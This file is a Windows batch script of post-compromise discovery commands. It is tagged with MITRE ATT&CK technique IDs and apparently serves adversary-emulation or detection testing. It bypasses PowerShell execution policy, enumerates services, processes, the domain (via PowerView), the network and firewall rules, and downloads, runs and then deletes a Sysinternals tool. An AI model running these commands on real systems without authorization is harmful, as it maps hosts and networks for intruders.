@echo Off
whoami
$env:username
powershell.exe -ExecutionPolicy Bypass -C "Get-Service > $env:TEMP\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\T1119_2.txt; Get-Process > $env:TEMP\T1119_3.txt"
cmd.exe /C net.exe start >> C:\Windows\Temp\service-list.txt 
powershell.exe -ExecutionPolicy Bypass -C "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";$download_folder = \"C:\Users\Public\\\";$staging_folder = \"C:\Users\Public\temp\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;iex $staging_folder\"\pslist.exe\" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\"PSTools.zip\";Remove-Item $staging_folder -Recurse" 
cmd.exe /C dir /s /b %USERPROFILE%\Favorites
powershell.exe -ExecutionPolicy Bypass -C "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\T1120_collection.txt"
powershell.exe -ExecutionPolicy Bypass -C "net accounts"
powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1;Get-DomainComputer"
powershell.exe -ExecutionPolicy Bypass -C "arp -a"
powershell.exe -ExecutionPolicy Bypass -C ".\wifi.ps1 -Pref"
netsh advfirewall firewall show rule name=all
powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1 -Force;Get-NetDomain | ConvertTo-Json -Depth 1"
powershell.exe -ExecutionPolicy Bypass -C "echo $(get-uac)"
powershell.exe -ExecutionPolicy Bypass -C "netstat -anto;Get-NetTCPConnection"
ping 127.0.0.1
